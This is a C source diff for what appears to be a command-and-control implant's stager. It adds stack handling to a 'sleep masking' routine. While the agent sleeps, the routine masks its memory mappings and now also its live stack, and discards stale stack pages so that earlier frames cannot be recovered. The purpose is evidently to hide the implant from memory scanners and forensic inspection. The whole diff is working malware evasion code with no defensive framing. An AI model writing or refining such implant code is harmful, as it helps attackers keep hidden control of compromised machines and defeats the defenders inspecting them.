@@ -27,6 +27,10 @@
 #define MASK_KEY_LEN 32
 /* The stager is freestanding and has no errno.h. */
 #define MASK_EINTR 4
+#define MASK_MADV_DONTNEED 4
+/* Leave room below the reported stack pointer for the caller's saved frame
+ * and the red zone before trimming the unused stack pages. */
+#define MASK_STACK_MARGIN (2u * PAGE_SIZE)
 /* Generous enough for a heavily loaded process; truncation leaves mappings
  * untouched rather than corrupting the map list. */
 #define MASK_MAX_MAPS 2048
@@ -288,7 +292,8 @@ static size_t add_image_ranges(struct mask_scratch *sc,
 
 static size_t find_ranges(struct mask_scratch *sc, uintptr_t keep_start,
                           uintptr_t keep_end, uintptr_t fs_base,
-                          uintptr_t gs_base, uintptr_t code_probe) {
+                          uintptr_t gs_base, uintptr_t code_probe,
+                          uintptr_t agent_sp) {
   char *text = sc->text;
   struct c2_map *maps = sc->maps;
   struct c2_map *ranges = sc->ranges;
@@ -318,10 +323,58 @@ static size_t find_ranges(struct mask_scratch *sc, uintptr_t keep_start,
       read_proc_stat_ranges(&arg_start, &arg_end, &env_start, &env_end);
   size_t n = 0;
 
-  /* Heap and stack are named agent-owned data mappings. The stack carries
-   * argv/env; leave those exact ranges readable so process inspection stays
-   * coherent. If the bounds cannot be read, skip the stack rather than corrupt
-   * the process command line. */
+  /* The agent reports the stack pointer it is sleeping on. Stage0 gives the
+   * agent an 8 MiB MAP_GROWSDOWN stack, but only the frames above the current
+   * pointer are live. Mask that region and drop the unused lower pages with
+   * MADV_DONTNEED: the mapping stays in place and grows back on demand, while
+   * stale frames from earlier calls do not survive the sleep. */
+  size_t stack_hint = (size_t)-1;
+  uintptr_t stack_start = 0;
+  for (size_t i = 0; i < nmaps; i++) {
+    if (maps[i].start <= agent_sp && agent_sp < maps[i].end) {
+      const struct c2_map *m = &maps[i];
+      int overlaps_keep = m->start < keep_end && keep_start < m->end;
+      int overlaps_scratch = m->start < scratch_end && scratch_start < m->end;
+      if (m->anonymous && (m->prot & PROT_READ) && (m->prot & PROT_WRITE) &&
+          !(m->prot & PROT_EXEC) && m->special != C2_MAP_SPECIAL_HEAP &&
+          !overlaps_keep && !overlaps_scratch &&
+          !map_excluded(m, fs_base, gs_base, code_probe, code_end))
+        stack_hint = i;
+      break;
+    }
+  }
+  if (stack_hint != (size_t)-1) {
+    stack_start = agent_sp > MASK_STACK_MARGIN ? agent_sp - MASK_STACK_MARGIN
+                                               : maps[stack_hint].start;
+    stack_start &= ~(uintptr_t)(PAGE_SIZE - 1);
+    if (stack_start < maps[stack_hint].start)
+      stack_start = maps[stack_hint].start;
+    if (stack_start >= maps[stack_hint].end) {
+      stack_hint = (size_t)-1;
+    } else if (stack_start > maps[stack_hint].start) {
+      (void)syscall3(SYS_madvise, (long)maps[stack_hint].start,
+                     (long)(stack_start - maps[stack_hint].start),
+                     MASK_MADV_DONTNEED);
+    }
+  }
+
+  /* Heap and thread stacks are agent-owned. The initial process stack carries
+   * argv/env; keep those exact ranges readable so process inspection stays
+   * coherent, and skip the stack when the bounds cannot be read rather than
+   * corrupt the command line. */
+  uintptr_t ex[4][2] = {
+      {keep_start, keep_end}, {scratch_start, scratch_end}, {0, 0}, {0, 0}};
+  size_t nex = 2;
+  if (have_argv_env) {
+    /* mprotect works on whole pages: round the argv/env exclusions outward so
+     * we never split a page. */
+    const uintptr_t pm = (uintptr_t)(PAGE_SIZE - 1);
+    ex[2][0] = arg_start & ~pm;
+    ex[2][1] = (arg_end + pm) & ~pm;
+    ex[3][0] = env_start & ~pm;
+    ex[3][1] = (env_end + pm) & ~pm;
+    nex = 4;
+  }
   for (size_t i = 0; i < nmaps; i++) {
     if (!maps[i].anonymous || !(maps[i].prot & PROT_READ))
       continue;
@@ -333,23 +386,23 @@ static size_t find_ranges(struct mask_scratch *sc, uintptr_t keep_start,
     if (maps[i].special == C2_MAP_SPECIAL_STACK) {
       if (!have_argv_env)
         continue;
-      /* mprotect works on whole pages: round the argv/env exclusions
-       * outward so we never split a page. */
-      const uintptr_t pm = (uintptr_t)(PAGE_SIZE - 1);
-      const uintptr_t argv_s = arg_start & ~pm;
-      const uintptr_t argv_e = (arg_end + pm) & ~pm;
-      const uintptr_t env_s = env_start & ~pm;
-      const uintptr_t env_e = (env_end + pm) & ~pm;
-      const uintptr_t ex[4][2] = {{keep_start, keep_end},
-                                  {scratch_start, scratch_end},
-                                  {argv_s, argv_e},
-                                  {env_s, env_e}};
-      n = mask_add_map_ex(maps[i].start, maps[i].end, maps[i].prot, ex, 4,
-                          ranges, cap, n);
+      uintptr_t start = (i == stack_hint) ? stack_start : maps[i].start;
+      n = mask_add_map_ex(start, maps[i].end, maps[i].prot, ex, nex, ranges,
+                          cap, n);
     } else {
       n = mask_add_map(maps[i].start, maps[i].end, maps[i].prot, keep_start,
                        keep_end, scratch_start, scratch_end, ranges, cap, n);
     }
+  }
+
+  /* A stack the kernel does not name (stage0's MAP_GROWSDOWN mapping or a
+   * thread stack) is not covered by the heap/stack pass above. Add the live
+   * part reported by the agent. */
+  if (stack_hint != (size_t)-1 &&
+      maps[stack_hint].special == C2_MAP_SPECIAL_NONE) {
+    n = mask_add_map(stack_start, maps[stack_hint].end, maps[stack_hint].prot,
+                     keep_start, keep_end, scratch_start, scratch_end, ranges,
+                     cap, n);
   }
 
   /* Every anonymous ELF image, writable mappings included: a loader that maps
@@ -361,6 +414,8 @@ static size_t find_ranges(struct mask_scratch *sc, uintptr_t keep_start,
    * the r-xp code segment actually masked. */
   int memfd = open("/proc/self/mem", O_RDONLY, 0);
   for (size_t i = 0; memfd >= 0 && i < nmaps; i++) {
+    if (i == stack_hint)
+      continue;
     if (!maps[i].anonymous || !(maps[i].prot & PROT_READ) ||
         maps[i].end - maps[i].start < 64)
       continue;
@@ -401,7 +456,6 @@ static void zero_key(volatile uint8_t *key, size_t len) {
 
 int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
                                uintptr_t keep_start, uintptr_t keep_end) {
-  (void)probe;
   uintptr_t fs_base = 0;
   uintptr_t gs_base = 0;
   (void)syscall2(SYS_arch_prctl, ARCH_GET_FS, (long)&fs_base);
@@ -413,8 +467,8 @@ int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
   if (sc == MAP_FAILED)
     return -1;
   struct c2_map *ranges = sc->ranges;
-  size_t n =
-      find_ranges(sc, keep_start, keep_end, fs_base, gs_base, code_probe);
+  size_t n = find_ranges(sc, keep_start, keep_end, fs_base, gs_base, code_probe,
+                         probe);
   if (n == 0) {
     munmap(sc, sizeof(*sc));
     return -1;
